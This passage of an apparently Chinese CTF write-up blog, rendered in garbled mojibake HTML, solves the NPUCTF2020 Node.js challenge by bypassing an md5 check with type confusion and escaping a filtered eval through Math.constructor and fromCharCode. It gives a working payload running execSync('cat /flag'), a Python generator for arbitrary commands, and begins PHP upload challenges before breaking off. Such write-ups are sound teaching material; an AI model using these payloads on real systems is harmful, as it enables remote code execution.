class="hljs-comment">//æ³¨æ„è¿™ä¸ªï¼Œæ˜¯å¦å­˜åœ¨ç»•è¿‡ï¼Ÿ</span><br>&#125; <span class="hljs-comment">// 2020.4/WORKER1 æ·¦ï¼Œä¸Šæ¬¡çš„åº“å¤ªåƒåœ¾ï¼Œæˆ‘è‡ªå·±å†™äº†ä¸€ä¸ª</span><br><br><span class="hljs-keyword">const</span> template = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;./index.html&#x27;</span>).<span class="hljs-title function_">toString</span>();<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">results</span>) &#123;<br>  <span class="hljs-keyword">return</span> template.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>));<br>&#125;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieSession</span>(&#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;PHPSESSION&#x27;</span>, <span class="hljs-comment">// 2020.3/WORKER2 å˜¿å˜¿ï¼Œç»™ğŸ‘´çˆªâ‘§</span><br>  keys<br>&#125;));<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(<span class="hljs-title class_">Object</span>);<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(<span class="hljs-title class_">Math</span>);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">let</span> result = <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">const</span> results = req.<span class="hljs-property">session</span>.<span class="hljs-property">results</span> || [];<br>  <span class="hljs-keyword">const</span> &#123; e, first, second &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (first &amp;&amp; second &amp;&amp; first.<span class="hljs-property">length</span> === second.<span class="hljs-property">length</span> &amp;&amp; first!==second &amp;&amp; <span class="hljs-title function_">md5</span>(first+keys[<span class="hljs-number">0</span>]) === <span class="hljs-title function_">md5</span>(second+keys[<span class="hljs-number">0</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span>.<span class="hljs-property">e</span>) &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>        result = <span class="hljs-title function_">saferEval</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">e</span>) || <span class="hljs-string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;<br>      &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e);<br>        result = <span class="hljs-string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;<br>      &#125;<br>      results.<span class="hljs-title function_">unshift</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;req.body.e&#125;</span>=<span class="hljs-subst">$&#123;result&#125;</span>`</span>);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    results.<span class="hljs-title function_">unshift</span>(<span class="hljs-string">&#x27;Not verified!&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (results.<span class="hljs-property">length</span> &gt; <span class="hljs-number">13</span>) &#123;<br>    results.<span class="hljs-title function_">pop</span>();<br>  &#125;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">results</span> = results;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">render</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">results</span>));<br>&#125;);<br><br><span class="hljs-comment">// 2019.10/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPI</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/source&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/javascript;charset=utf-8&#x27;</span>);<br>  res.<span class="hljs-title function_">send</span>(fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;./index.js&#x27;</span>));<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/html;charset=utf-8&#x27;</span>);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">admin</span> = req.<span class="hljs-property">session</span>.<span class="hljs-property">admin</span> || <span class="hljs-number">0</span>;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">render</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">results</span> = req.<span class="hljs-property">session</span>.<span class="hljs-property">results</span> || []))<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">80</span>, <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Start listening&#x27;</span>)<br>&#125;);<br></code></pre></td></tr></table></figure><p>å¦‚æœæƒ³åˆ©ç”¨<code>saferEval</code>ï¼Œé¦–å…ˆè¦æ»¡è¶³è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (first &amp;&amp; second &amp;&amp; first.<span class="hljs-property">length</span> === second.<span class="hljs-property">length</span> &amp;&amp; first!==second &amp;&amp; <span class="hljs-title function_">md5</span>(first+keys[<span class="hljs-number">0</span>]) === <span class="hljs-title function_">md5</span>(second+keys[<span class="hljs-number">0</span>]))<br></code></pre></td></tr></table></figure><p><code>js</code>è¿™ä¸œè¥¿å’Œ<code>php</code>ä¹Ÿå­˜åœ¨å¼ºç­‰äºå¼±ç­‰äºä¹‹ç±»çš„é—®é¢˜ï¼Œå…·ä½“å¯ä»¥å‚è€ƒ<code>susec</code>è¿™é“é¢˜ï¼š</p><p><a href="https://johnfrod.top/ctf/susec-ctf-2020web-0/">å‚è€ƒèµ„æ–™</a></p><p>æ‰€ä»¥ä»¤<code>first</code>ä¸º<code>&quot;0&quot;</code>,<code>second</code>ä¸º<code>[0]</code>å³å¯(æ³¨æ„è¿™é‡Œä¸èƒ½ç›´æ¥ç”¨æ•°å­—ï¼Œå› ä¸ºæ•°å­—æ²¡æœ‰<code>length</code>å±æ€§)ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>JSON</code>æ ¼å¼æäº¤æ•°æ®ï¼Œä¸­é—´ä»¶å°†å¯¹å…¶è¿›è¡Œè§£æï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br></code></pre></td></tr></table></figure><p>å¯ä»¥<code>POST</code>æäº¤ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;e&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;payload&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;first&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;second&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><code>payload</code>æ˜¯<code>saferEval</code>å‡½æ•°çš„å‚æ•°ï¼Œçœ‹çœ‹<code>saferEval</code>å¹²äº†å•¥ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">saferEval</span>(<span class="hljs-params">str</span>) &#123;<br>  <span class="hljs-keyword">if</span> (str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(str); <br>&#125; <br></code></pre></td></tr></table></figure><p><a href="https://blog.z3ratu1.top/[NPUCTF2020]%E9%AA%8C%E8%AF%81%F0%9F%90%8E.html">å‚è€ƒèµ„æ–™</a></p><p><code>(?:Math(?:\.\w+)?)</code>ï¼šåŒ¹é… <code>Math.[0-9a-z]</code></p><p><code>[()+\-*/&amp;|^%&lt;&gt;=,?:]</code>ï¼šåŒ¹é…ä¸­æ‹¬å·å†…ä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼ˆ<code>\-</code>ä¸ºå‡å·ï¼‰</p><p><code>(?:\d+\.?\d*(?:e\d+)?)</code>ï¼šåŒ¹é… æ•°å­—å¼€å¤´  ä¸€ä¸ªæˆ–é›¶ä¸ªç‚¹  ä¸€ä¸ªæˆ–é›¶ä¸ª e[0-9]</p><p><code> </code>ï¼šåŒ¹é…ç©ºæ ¼</p><p>åŒ¹é…åˆ°è¿™äº›ä¸œè¥¿ä¼šæ›¿æ¢æˆç©ºï¼Œå¦‚æœæœ€ç»ˆä¸ºç©ºçš„è¯æ‰èƒ½è°ƒç”¨<code>eval</code>ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-function"><span class="hljs-params">Math</span>=&gt;</span><br>        (<span class="hljs-title class_">Math</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>,<br>                <span class="hljs-title class_">Math</span>.<span class="hljs-property">x</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span><br><span class="hljs-params">                    <span class="hljs-built_in">Math</span>.fromCharCode(<span class="hljs-number">114</span>,<span class="hljs-number">101</span>,<span class="hljs-number">116</span>,<span class="hljs-number">117</span>,<span class="hljs-number">114</span>,<span class="hljs-number">110</span>,<span class="hljs-number">32</span>,<span class="hljs-number">112</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,</span><br><span class="hljs-params">                        <span class="hljs-number">99</span>,<span class="hljs-number">101</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">46</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">77</span>,<span class="hljs-number">111</span>,<span class="hljs-number">100</span>,<span class="hljs-number">117</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,</span><br><span class="hljs-params">                        <span class="hljs-number">46</span>,<span class="hljs-number">114</span>,<span class="hljs-number">101</span>,<span class="hljs-number">113</span>,<span class="hljs-number">117</span>,<span class="hljs-number">105</span>,<span class="hljs-number">114</span>,<span class="hljs-number">101</span>,<span class="hljs-number">40</span>,<span class="hljs-number">39</span>,<span class="hljs-number">99</span>,<span class="hljs-number">104</span>,<span class="hljs-number">105</span>,<span class="hljs-number">108</span>,<span class="hljs-number">100</span>,</span><br><span class="hljs-params">                        <span class="hljs-number">95</span>,<span class="hljs-number">112</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">99</span>,<span class="hljs-number">101</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">39</span>,<span class="hljs-number">41</span>,<span class="hljs-number">46</span>,<span class="hljs-number">101</span>,<span class="hljs-number">120</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">83</span>,</span><br><span class="hljs-params">                        <span class="hljs-number">121</span>,<span class="hljs-number">110</span>,<span class="hljs-number">99</span>,<span class="hljs-number">40</span>,<span class="hljs-number">39</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">47</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">39</span>,<span class="hljs-number">41</span>)</span>)(<span class="hljs-params"></span>)<br>        )<br>)(<span class="hljs-title class_">Math</span>+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><code>romCharCode</code> æ˜¯ JavaScript ä¸­çš„æ–¹æ³•ï¼Œç”¨äºå°† Unicode ç¼–ç è½¬æ¢ä¸ºå­—ç¬¦ï¼Œç›¸å½“äºï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-function"><span class="hljs-params">Math</span>=&gt;</span><br>        (<span class="hljs-title class_">Math</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>,<br>                <span class="hljs-title class_">Math</span>.<span class="hljs-property">x</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString()&quot;</span></span>)(<span class="hljs-params"></span>)<br>        )<br>)(<span class="hljs-title class_">Math</span>+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>å…ˆæ˜¯è¿™éƒ¨åˆ†ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Math</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>,<br><span class="hljs-title class_">Math</span>.<span class="hljs-property">x</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span><br></code></pre></td></tr></table></figure><p>node:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">&gt; <span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span><br>[<span class="hljs-title class_">Function</span>: <span class="hljs-title class_">Object</span>]<br>&gt; <span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>.<span class="hljs-property">constructor</span><br>[<span class="hljs-title class_">Function</span>: <span class="hljs-title class_">Function</span>]<br></code></pre></td></tr></table></figure><p>è¿”å›äº†ä¸€ä¸ª<code>Function</code>ï¼Œ<code>js</code>ä¸­æ¯ä¸ªå‡½æ•°å®é™…ä¸Šéƒ½æ˜¯ä¸€ä¸ª<code>Function</code> å¯¹è±¡ã€‚å®ƒå¯ä»¥åŠ¨æ€çš„åˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js">&gt; (<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;&#125;).<span class="hljs-property">constructor</span><br>[<span class="hljs-title class_">Function</span>: <span class="hljs-title class_">Function</span>]<br>&gt; add = <span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-keyword">return</span> a + b<span class="hljs-string">&#x27;)</span></span><br><span class="hljs-string"><span class="hljs-params">add = Math.constructor.constructor(&#x27;</span>a<span class="hljs-string">&#x27;,&#x27;</span>b<span class="hljs-string">&#x27;,return a + b&#x27;</span></span>)<br>                                           ^^^^^^<br><br><span class="hljs-title class_">Uncaught</span> <span class="hljs-title class_">SyntaxError</span>: <span class="hljs-title class_">Unexpected</span> token <span class="hljs-string">&#x27;return&#x27;</span><br>&gt; add = <span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;return a + b&#x27;</span></span>)<br>[<span class="hljs-title class_">Function</span>: anonymous]<br>&gt; <span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-number">3</span><br>&gt; sum = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;return a + b &#x27;</span>)<br>[<span class="hljs-title class_">Function</span>: anonymous]<br>&gt; <span class="hljs-title function_">sum</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>è¦æ‰§è¡Œçš„å‘½ä»¤æ˜¯ï¼šæ³¨æ„æœ€åé¢åŠ äº†ä¸ª<code>()</code>è¡¨ç¤ºç«‹åˆ»æ‰§è¡Œ(è‡ªè°ƒç”¨å‡½æ•°)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString()&quot;</span>)()<br></code></pre></td></tr></table></figure><p>å†æŠŠç¬¬ä¸€è¡ŒåŠ ä¸Šï¼Œå‘ç°è¿™ä¸œè¥¿å°±æ˜¯ä¸ªç®­å¤´å‡½æ•°è‡ªè°ƒç”¨ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-function"><span class="hljs-params">Math</span>=&gt;</span><br>        (<span class="hljs-title class_">Math</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>,<br>                <span class="hljs-title class_">Math</span>.<span class="hljs-property">x</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString()&quot;</span></span>)(<span class="hljs-params"></span>)<br>        )<br>)(<span class="hljs-title class_">Math</span>+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/npuctf2020yzm1.png" alt="npuctf2020yzm1"></p><p>æœ€åçš„<code>(Math+1)</code>è¿™ä¸ªå‚æ•°å…¶å®æ˜¯ä¸ºäº†è·å–<code>String</code>å¯¹è±¡ï¼Œå› ä¸º<code>fromCharCode</code>æ–¹æ³•æ˜¯ä¸ªå­—ç¬¦ä¸²æ–¹æ³•ï¼Œæ‰€ä»¥å‰é¢çš„<code>Math.constructor</code>å•¥çš„å¥½åƒæ²¡æœ‰æ¼”ç¤ºçš„å¿…è¦ï¼Ÿ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">&gt; <span class="hljs-title class_">String</span>.<span class="hljs-property">constructor</span><br>[<span class="hljs-title class_">Function</span>: <span class="hljs-title class_">Function</span>]<br>&gt; <span class="hljs-title class_">String</span>.<span class="hljs-property">constructor</span>.<span class="hljs-property">constructor</span><br>[<span class="hljs-title class_">Function</span>: <span class="hljs-title class_">Function</span>]<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen</span>(<span class="hljs-params">cmd</span>):<br>    s = <span class="hljs-string">f&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;<span class="hljs-subst">&#123;cmd&#125;</span>&#x27;).toString()&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;,&#x27;</span>.join([<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s])<br><br><span class="hljs-built_in">print</span>(gen(<span class="hljs-string">&#x27;dir&#x27;</span>))<br></code></pre></td></tr></table></figure><p>PAYLOAD:</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">Content-Type: application/JSON<br><br>&#123;<br>  &quot;e&quot;: &quot;(Math=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(<span class="hljs-number">114,101,116,117</span>,<span class="hljs-number">114,110,32,112</span>,<span class="hljs-number">114,111,99,101</span>,<span class="hljs-number">115,115,46,109</span>,<span class="hljs-number">97,105,110,77</span>,<span class="hljs-number">111,100,117,108</span>,<span class="hljs-number">101,46,114,101</span>,<span class="hljs-number">113,117,105,114</span>,<span class="hljs-number">101,40,39,99</span>,<span class="hljs-number">104,105,108,100</span>,<span class="hljs-number">95,112,114,111</span>,<span class="hljs-number">99,101,115,115</span>,<span class="hljs-number">39,41,46,101</span>,<span class="hljs-number">120,101,99,83</span>,<span class="hljs-number">121,110,99,40</span>,<span class="hljs-number">39,99,97,116</span>,<span class="hljs-number">32,47,102,108</span>,<span class="hljs-number">97,103,39,41</span>,<span class="hljs-number">46,116,111,83</span>,<span class="hljs-number">116,114,105,110</span>,<span class="hljs-number">103,40,41</span>))()))(Math+<span class="hljs-number">1</span>)&quot;,<br>  &quot;first&quot;: [<span class="hljs-number">0</span>],<br>  &quot;second&quot;: &quot;<span class="hljs-number">0</span>&quot;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æ€è·¯æ€»ç»“"><a href="#æ€è·¯æ€»ç»“" class="headerlink" title="æ€è·¯æ€»ç»“"></a>æ€è·¯æ€»ç»“</h4><p><code>js</code>å¼±ç›¸ç­‰ï¼Ÿå¼ºç›¸ç­‰ï¼Ÿä»»æ„æ•°æ®ç±»å‹æ‹¼æ¥åæ˜¯å­—ç¬¦ä¸²ï¼Ÿ<code>length</code>å±æ€§å¯¹äºæ•°å­—æ˜¯å¦ç”Ÿæ•ˆï¼Ÿ<code>Function</code>å¯¹è±¡ï¼Ÿç®­å¤´å‡½æ•°è‡ªè°ƒç”¨ï¼Ÿ<code>fromCharCode</code>æ–¹æ³•ï¼Ÿ</p><h2 id="å¼ºç½‘æ¯-2019-Upload"><a href="#å¼ºç½‘æ¯-2019-Upload" class="headerlink" title="[å¼ºç½‘æ¯ 2019]Upload"></a>[å¼ºç½‘æ¯ 2019]Upload</h2><p>è¿›å»é¦–å…ˆæ˜¯ä¸ªæ³¨å†Œç™»å½•ç•Œé¢ï¼Œæ ¹æ®é¢˜ç›®åå°±æ²¡å¾€<code>SQL</code>æ³¨å…¥é‚£è¾¹æƒ³ï¼Œæ³¨å†Œä¸€ä¸ªç”¨æˆ·ç™»å½•ç„¶åä¸Šä¼ å›¾ç‰‡ï¼š</p><p><img src="/img/qwb2019upload1.png" alt="qwb2019upload1"></p><p>è¿™é‡Œçš„<code>cookie</code>å·²ç»æ˜¯æˆ‘è§£ç åçš„æ•°æ®(ä¸€ä¸²åºåˆ—åŒ–åçš„ç”¨æˆ·ä¿¡æ¯)ã€‚</p><p>å¥‡æ€ªçš„æ˜¯ä¸ç®¡æˆ‘æ€ä¹ˆä¸Šä¼ å›¾ç‰‡éƒ½æ˜¯æ˜¾ç¤º<code>404</code>ã€‚ã€‚ä»–å¦ˆçš„å¯èƒ½ç¯å¢ƒæœ‰é—®é¢˜ï¼Œç•™ç€åé¢å†åšå§</p><h2 id="å®‰æ´µæ¯-2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "><a href="#å®‰æ´µæ¯-2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "></a>[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </h2><p>è¿™é¢˜éœ€è¦æ‰¾æºç ï¼Œ<code>buu</code>ä¸Šç›´æ¥ç»™äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//show.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./helper.php&quot;</span>);<br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">show</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;delete_all&quot;</span>])&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;delete_all&quot;</span>] == <span class="hljs-string">&quot;true&quot;</span>)&#123;<br><span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">Delete_All_Images</span>();<br>&#125;<br>&#125;<br><span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">Get_All_Images</span>();<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">show</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$con</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;con = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>(<span class="hljs-variable">$this</span>-&gt;con))&#123; <br>   <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get_All_Images</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM images&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$this</span>-&gt;con, <span class="hljs-variable">$sql</span>);<br><span 